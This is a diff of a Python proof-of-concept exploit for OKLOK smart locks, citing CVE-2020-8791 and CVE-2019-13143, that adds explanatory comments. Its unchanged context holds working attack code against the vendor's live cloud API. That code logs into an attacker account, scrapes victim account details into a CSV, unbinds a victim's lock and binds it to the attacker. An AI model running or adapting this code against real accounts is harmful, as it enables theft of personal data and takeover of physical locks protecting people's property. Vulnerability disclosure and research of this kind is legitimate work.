@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
 
+#PoC remote attack scenario based on CVE-2020-8791 and CVE-2019-13143 
+#See original CVE-2019-13143 PoC exploit code by securelayer7 (https://github.com/securelayer7/pwnfb50/blob/master/pwnfb50.py)
+
+#unbind lock from victim account, bind to attacker account, retrieve user account details, generate userdata.csv
+
 import requests
 import json
 import sys
@@ -7,11 +12,11 @@ import datetime
 import getpass
 import csv
 
-
+#login to the attacker account and get attacker token to be used in further requests
+#get attacker user ID for binding the lock later
 def login_attacker(attacker_email_address, attacker_password):
 		
 	login_url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'
-
 	body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}
 
 	login_headers = {'Host': 'app.oklok.com.cn',
@@ -44,6 +49,7 @@ def login_attacker(attacker_email_address, attacker_password):
 	else:
 		sys.exit('Login not successful.')
 
+#get user info and write userdata.csv
 def scan_id(victim_userID, attacker_token, attacker_userID, headers):
 
 	get_user_info = 'https://app.oklok.com.cn/oklock/user/getInfo'
@@ -139,7 +145,7 @@ def scan_id(victim_userID, attacker_token, attacker_userID, headers):
 			writer.writerow([email_address,'N/A','N/A','N/A'])
 
 
-
+#unbind the lock from the victim account
 def unbind(victim_userID, lockId, attacker_token, barcode, headers):
 	url = 'https://app.oklok.com.cn/oklock/lock/unbind'
 	body = {"userId":victim_userID,"lockId":lockId}
@@ -156,7 +162,7 @@ def unbind(victim_userID, lockId, attacker_token, barcode, headers):
 	print('-------------------------------------------------------------\n')
 
 
-
+#bind the lock to the attacker account
 def bind(attacker_userID, mac, name, attacker_token, barcode, headers):
 	url = 'https://app.oklok.com.cn/oklock/lock/bind'
 	body = {"isLock":"1","userId": attacker_userID,"mac":mac,"name":name}
